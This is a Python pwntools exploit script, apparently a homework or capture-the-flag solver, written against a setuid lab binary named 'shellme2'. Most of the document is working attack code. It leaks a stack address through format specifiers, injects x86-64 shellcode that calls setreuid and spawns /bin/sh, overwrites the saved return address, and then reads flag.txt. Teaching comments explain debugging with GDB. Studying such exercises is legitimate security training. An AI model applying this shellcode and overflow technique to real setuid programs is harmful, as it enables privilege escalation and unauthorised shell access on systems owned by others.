#!/usr/bin/env python3

'''run this script within a tmux session using:
tmux
python3 ./solver.py

You need to adjust your user id and the offset in the lines marked with FIXME
'''

import time
import shutil
import os 
import stat
from pwn import *

DEBUG=False #FIXME make DEBUG=False if you do not want to use GDB to debug

#we set the architecture to Intel 64bit and the operating system to Linux
context(arch = 'amd64', os = 'linux')
#the following line tells pwntools that, when we call gdb.attach, we need to run GDB in a separate tmux panel
#this is useful if you are using pwntools on a system without a GUI (like the homework server)
context.terminal = ["tmux", "splitw", "-h"]

#when we want to debug this, we do not want to run the original shellme
#since shellme runs run with an effective user id different than our user id, making GDB unable to attach to it
#hence, we make a copy of it, we set it as executable, and we run it
if DEBUG:
    try:
        os.remove("./shellme2_copy")
    except OSError:
        pass
    shutil.copyfile("shellme2", "shellme2_copy")
    st = os.stat('shellme2_copy')
    os.chmod('shellme2_copy', st.st_mode|stat.S_IEXEC)

    io = process(['./shellme2', 'rsi: %p rdx: %p rcx: %p r8: %p r9: %p stack: %p %p'])
else:
    io = process(['./shellme2', 'rsi: %p rdx: %p rcx: %p r8: %p r9: %p stack: %p %p'])

#we finish reading the line from shellme, and we extract the location of the buffer
firstPrintf = io.readline().decode().rstrip()

stackaddr = firstPrintf.split(" ")[12]
print("stackaddr: ", stackaddr)
#we are going to place the shellcode at the beginning of the buffer
#so the beginning of the buffer is our "target" address
target_addr = int(stackaddr, 16)
print("the target address is: ",hex(target_addr))

#the following shellcode is not very optimized
get_shell = '''
        mov ecx, 1008 #FIXME Change 1007 to the effective user id of shellme
        mov edi, ecx
        mov esi, ecx
        mov rax, 113
        syscall #note that if DEBUG==True, this syscall will fail (rax will be set to a value < 0)
    
        mov     rbx,0x68732f6e69622f2f
        shr     rbx,0x8
        push    rbx
        mov     rdi,rsp
        xor     rdx,rdx ;rdx=0
        push    rdx
        push    rdi
        mov     rsi,rsp
        xor     rax,rax
        mov     al,0x3b
        syscall
'''

#if you want, you can add an int3 at the beginning of the shellcode
#to trigger a breakpoint in GDB when the shellcode execution starts
#get_shell = "int3\n" + get_shell

# if DEBUG:
#     #these are the commands that GDB executes automatically
#     #this is the equivalent of using a command file with the -x option
#     #the first command enables the GDB-GEF plugin
#     #b *0x4011fc puts a breakpoint on the ret instruction of the get_name function
#     #this breakpoint is helpful to debug if we set the offset variable correctly
#     #c makes GDB continuing the execution after attaching to shellme
#     gdb_commands = '''source /usr/local/share/gef/gef.py
#     b *0x4011fc
#     c
#     '''
#     gdb.attach(io, gdbscript=gdb_commands)

#this is the distance between the buffer and the saved return address
#our payload will look like:
# <------ 150 bytes ------------------->|<-- 8 bytes ->
#[shellcode with padding up to 150 bytes|target_address]
offset = 136 #FIXME it should not be 150
#if this value is too high, you will see that the saved return address is overwritten by \xfe characters
#in this case you should lower the value of offset such that target_address ends up being on top of the stack when ret is about to be executed

payload = asm(get_shell)
#alternative you can use something as below:
#payload = asm(shellcraft.setreuid() + shellcraft.sh())

#if this is more than the offset specified below
#it means that we do not have enough space in the buffer for our shellcode
print(len(payload))
payload = payload.ljust(offset, b'\xfe')
payload += p64(target_addr)
print("payload: ", repr(payload))

#we send the payload to shellme
io.sendline(payload)

# #to be careful, we first receive, line by line, what the program sent us before the execution of /bin/sh
# print(repr(io.recvline())) #remember that, by default, recv is blocking, it will stall if no content is available
# print(repr(io.recvline()))
# print(repr(io.recvline()))
# print(repr(io.recvline()))
# print(repr(io.recvline())) 
# #then, to be sure, we wait 0.1 seconds and we flush stdin with new lines
time.sleep(0.1)
# io.sendline(b"\n\n\n")

if DEBUG:
    #in debug mode, you will have a shell with GDB attached to the program, breaking on the ret instruction
    #you can continue the execution running:
    #del 1 (to delete the breakpoint we added)
    #and then
    #c
    #after you run the command "c" GDB should tell you that /usr/bin/dash has started

    #on the other shell window, using io.interactive(), we get an interactive shell we can use to interact
    #with the /bin/sh process we have just spawn
    #if we use io.interactive(), we don't need to use the code after it, but we just need to type:
    #cat flag.txt
    #on the interactive shell
    io.interactive()
    #using this interactive shell, when can use commands such as "ls" or "cat"
    #however, if DEBUG==True, "cat flag.txt" will fail, since we are executing shell_copy,
    #which does not run with enough permissions

    #at this point a GDB panel is opened
    #use the command "c" to make the execution continue after the ret instruction of get_name
    #after the spawning of /bin/sh, if GDB complains saying "Cannot insert breakpoint", delete the breakpoint 
    #using "del 1" and continue the execution with "c"
else:
    #we send to the spawn /bin/sh the command we want to execute
    io.sendline(b"cat flag.txt\n")
    #we just print back the exploit outputted, it should contain the flag
    print(io.readline().decode())
    print(io.readline().decode())

